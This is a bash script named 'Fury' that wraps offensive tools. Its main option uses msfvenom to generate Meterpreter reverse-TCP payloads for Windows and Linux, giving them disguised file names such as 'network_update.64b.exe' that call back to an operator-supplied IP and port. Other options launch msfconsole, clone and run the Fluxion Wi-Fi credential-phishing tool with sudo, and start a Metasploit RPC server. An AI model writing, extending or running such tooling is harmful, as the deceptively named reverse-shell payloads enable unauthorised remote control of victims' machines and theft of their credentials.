#!/bin/bash

readonly RED="\e[1;31m"
readonly GREEN="\e[1;32m"
readonly YELLOW="\e[1;33m"
readonly RESET="\e[0m"
readonly VERSION="v.0.0.7"
readonly NOTES="No notes available."

echo -e "${RED}"

cat << "EOF"
    ______
   / ____/_  _________  __
  / /_  / / / / ___/ / / /
 / __/ / /_/ / /  / /_/ /
/_/    \__,_/_/   \__, /
                 /____/

EOF
echo -e "${YELLOW}Fury $VERSION"

if [ -z "$1" ]; then
        echo -e "${RED}Error. Try using a flag like -h to view help." >&2
        exit 1
elif [ "$1" == "-h" ]; then
        echo "-----------------------------------"
        echo "Use -h to view this message"
        echo "Use -u to view the usage of all options"
        echo "Use -gp to generate a payload"
        echo "Use -lc to launch the console"
        echo "Use -lf to launch fluxtion"
        echo "Use -ls to launch a metasploit server"
        echo "-----------------------------------"
elif [ "$1" == "-u" ]; then
        echo "-------------------------------------------------------------"
        echo "Usage for -gp: use the -gp flag and follow the instructions."
        echo "Usage for -lc: use the -lc flag and type your commands."
        echo "Usage for -lf: use the -lf flag to enter the fluxtion terminal (be sure that you are inside your fluxtion tool directory and don't worry if it isn't installed because Fury will install it automatically)."
        echo "Usage for -ls: use the -ls flag and follow its instructions to create a Metasploit Server"
        echo "-------------------------------------------------------------"
elif [ "$1" == "-gp" ]; then
        read -p "Enter the operating system: " OS
        read -p "Enter the architecture: " architecture
        read -p "Enter your IPv4 address: " HOST
        read -p "Enter your port: " PORT
        if [ "$OS" != "windows" ] && [ "$OS" != "linux" ]; then
                echo -e "${RED}Error. Operating system not found."
                exit 1
        elif [ "$OS" == "windows" ] && [ "$architecture" == "x64" ]; then
                echo -e "[*] Generating $OS $architecture payload...${RESET}"
                if [ ! -d "payloads" ]; then
                        mkdir payloads
                fi
                msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f exe -o payloads/network_update.64b.exe
                echo -e "${GREEN}[+] Payload generated!"
        elif [ "$OS" == "windows" ] && [ "$architecture" == "x86" ]; then
                echo -e "[*] Generating $OS $architecture payload...${RESET}"
                if [ ! -d "payloads" ]; then
                        mkdir payloads
                fi
                msfvenom -p windows/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f exe -o payloads/network_update.32b.exe
                echo -e "${GREEN}[+] Payload generated!"
        elif [ "$OS" == "linux" ] && [ "$architecture" == "x64" ]; then
                echo -e "[*] Generating $OS $architecture payload...${RESET}"
                if [ ! -d "payloads" ]; then
                        mkdir payloads
                fi
                msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f elf -o payloads/network_update.64b.elf
                echo -e "${GREEN}[+] Payload generated!"
        elif [ "$OS" == "linux" ] && [ "$architecture" == "x86" ]; then
                echo -e "[*] Generating $OS $architecture payload...${RESET}"
                if [ ! -d "payloads" ]; then
                        mkdir payloads
                fi
                msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f elf -o payloads/network_update.32b.elf
                echo -e "${GREEN}[+] Payload generated!"
        fi
elif [ "$1" == "-lc" ]; then
        echo -e "[*] Launching console...${RESET}"
        msfconsole
        echo -e "${YELLOW}[*] Console killed."
elif [ "$1" == "-lf" ]; then
        if [ -d "fluxion" ]; then
                echo -e "${GREEN}[+] Launching flaxion...${RESET}"
                cd fluxion
                sudo ./fluxion.sh
                echo -e "${YELLOW}[*] Fluxion closed."
        else
                echo -e "${RED}[!] Error. Fluxion not found. Press q to stop the cloning repo...${RESET}"
                read -t 5 -n 1 key
                if [ "$key" == "q" ]; then
                        echo -e "${YELLOW}[*] Exiting install..."
                        exit 0
                fi
                git clone https://github.com/FluxionNetwork/fluxion.git
                echo -e "${GREEN}[+] Launching fluxion..."
                cd fluxion
                chmod +x fluxion.sh
                sudo ./fluxion.sh -i
        fi
elif [ "$1" == "-ls" ]; then
        read -p "Enter your password: " password
        read -p "Enter your port: " port
        read -p "Enter your IPv4 address: " address
        echo -e "[+] Starting msfrpcd server with username 'msf'...${RESET}"
        sudo systemctl start postgresql
        sudo msfdb init && sudo msfdb reinit
        msfrpcd -P $password -p $port -U msf -a $address -S
        echo -e "${GREEN}[+] Server started!"
else
        echo -e "${RED}Error. Invalid flag. Try -h to view help." >&2
        exit 1
fi

echo -e "${RESET}"
